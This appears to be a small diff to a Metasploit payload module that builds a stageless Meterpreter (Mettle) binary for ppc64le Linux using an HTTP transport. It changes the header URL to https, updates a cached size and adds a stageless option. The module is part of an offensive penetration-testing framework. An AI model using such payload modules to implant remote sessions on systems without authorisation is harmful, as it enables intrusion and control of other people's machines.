@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -10,7 +10,7 @@ require 'msf/base/sessions/meterpreter_ppc64le_linux'
 
 module MetasploitModule
 
-  CachedSize = 789888
+  CachedSize = 855928
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -36,7 +36,10 @@ module MetasploitModule
   end
 
   def generate
-    opts = {scheme: 'http'}
+    opts = {
+      scheme: 'http',
+      stageless: true
+    }
     MetasploitPayloads::Mettle.new('powerpc64le-linux-musl', generate_config(opts)).to_binary :exec
   end
 end
